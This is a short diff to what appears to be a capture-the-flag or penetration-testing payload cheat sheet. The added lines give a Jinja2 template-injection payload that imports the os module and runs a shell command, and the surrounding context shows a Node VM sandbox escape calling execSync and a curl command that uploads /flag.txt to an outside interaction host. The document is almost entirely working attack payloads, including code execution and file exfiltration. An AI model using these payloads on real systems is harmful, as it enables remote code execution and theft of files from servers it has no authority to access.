@@ -20,6 +20,12 @@ Escape Node VM Sandbox
 
     this.constructor.constructor("return this.process")().mainModule.require("child_process").execSync("id").toString()
 
+### Python
+
+#### Jinja2 / Template Injection
+
+    {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
 ### Exfiltrate
 
     curl -T /flag.txt xxxx.interct.sh
